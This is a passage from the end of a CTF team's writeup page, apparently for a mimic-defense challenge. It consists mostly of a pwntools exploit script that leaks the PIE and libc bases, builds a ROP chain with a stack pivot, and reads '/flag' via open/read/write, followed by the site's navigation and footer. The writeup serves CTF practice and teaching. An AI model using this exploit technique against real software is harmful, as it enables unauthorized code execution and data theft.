</span></span><span class=line><span class=cl><span class=n>libc_os</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                <span class=p>:</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>x</span>
</span></span><span class=line><span class=cl><span class=n>clear</span>       <span class=o>=</span>       <span class=k>lambda</span>                            <span class=p>:</span> <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;clear&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_sb</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>choice</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>commend</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b *$rebase(0x0000000000001A6B)
</span></span></span><span class=line><span class=cl><span class=s1>b *$rebase(0x000000000000131E)
</span></span></span><span class=line><span class=cl><span class=s1>b _IO_getline
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Enter magic number:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;12803159&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#11ff414141414141&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2445454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39; handler=&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pie_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>rl</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x00000000000018C0</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>pie_base</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;pie_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x000000000000101a</span> 
</span></span><span class=line><span class=cl><span class=n>ret_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000001557</span>
</span></span><span class=line><span class=cl><span class=n>rdi_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span>
</span></span><span class=line><span class=cl><span class=n>puts_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>puts_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fgets_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>fgets</span>
</span></span><span class=line><span class=cl><span class=n>fgets_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>fgets_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>puts</span>
</span></span><span class=line><span class=cl><span class=n>puts_p</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>puts_plt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>set_puts</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000016F0</span>
</span></span><span class=line><span class=cl><span class=n>set_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>set_puts</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rbp</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000001693</span>
</span></span><span class=line><span class=cl><span class=n>pop_rbp</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>pop_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x000000000000130F</span>
</span></span><span class=line><span class=cl><span class=n>main_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>main</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>input_addr</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6088</span>
</span></span><span class=line><span class=cl><span class=n>input_addr</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>input_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#10ff&#39;</span> <span class=o>+</span> <span class=n>ret_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#21&#39;</span> <span class=o>+</span><span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>rdi_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#22&#39;</span> <span class=o>+</span> <span class=n>rdi_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>10</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>fgets_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#23&#39;</span> <span class=o>+</span> <span class=n>fgets_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>8</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>puts_p</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>10</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#24&#39;</span> <span class=o>+</span> <span class=n>puts_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>6</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>pop_rbp</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>12</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#25&#39;</span> <span class=o>+</span> <span class=n>pop_rbp</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>4</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>input_addr</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>14</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#26&#39;</span> <span class=o>+</span> <span class=n>input_addr</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>2</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#27&#39;</span> <span class=o>+</span> <span class=n>main_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#28&#39;</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span> <span class=o>+</span> <span class=s1>&#39;454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2945454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2a45454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2b45454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2c45454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2d45454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2e45454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2f45454545454545&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2146464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2246464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2346464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2446464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2546464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2646464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2746464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2846464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2946464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2a46464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2b46464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2c46464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2d46464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2e46464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2f46464646464646&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2147474747474747&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2247474747474747&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2347474747474747&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2447474747474747&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2547474747474747&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#264747474747&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gad</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x00000000000012d3</span> <span class=c1>#  push rdi ; pop rsp ; ret</span>
</span></span><span class=line><span class=cl><span class=n>gadge</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>gad</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># åç»­æ˜¯ p__puts_w </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># debug(commend)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#27&#39;</span> <span class=o>+</span> <span class=n>gadge</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fgets_addr</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>rl</span><span class=p>()[</span><span class=mi>1</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>fgets_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;fgets&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>o</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span> 
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span> 
</span></span><span class=line><span class=cl><span class=n>w</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000001555</span>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x000000000000101a</span>
</span></span><span class=line><span class=cl><span class=n>rbx</span> <span class=o>=</span> <span class=n>libc_os</span><span class=p>(</span><span class=mh>0x00000000000586e4</span><span class=p>)</span> <span class=c1>#  pop rbx ; ret</span>
</span></span><span class=line><span class=cl><span class=n>rdx</span> <span class=o>=</span> <span class=n>libc_os</span><span class=p>(</span><span class=mh>0x00000000000b0133</span><span class=p>)</span> <span class=c1>#  mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>*</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>rdi</span><span class=p>,</span><span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6188</span><span class=p>,</span><span class=n>rsi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>o</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>rdi</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=n>rsi</span><span class=p>,</span><span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6288</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rbx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>r</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>rdi</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>rsi</span><span class=p>,</span><span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6288</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rbx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>w</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/flag</span><span class=se>\x00\x00\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x200</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/%E6%8B%9F%E6%80%81/>æ‹Ÿæ€</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/ntfy-2022-su-wu/>ç¬¬äº”å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Writeup</a></li><li><a href=/post/ntfy-2021-su-wu/>ç¬¬å››å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Write-Up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/wmctf-2025-su-wu/ data-toggle=tooltip data-placement=top title="2025 WMCTF SU WriteUp">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/rctf-2025-su-wu/ data-toggle=tooltip data-placement=top title="2025 RCTF SU WriteUp">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>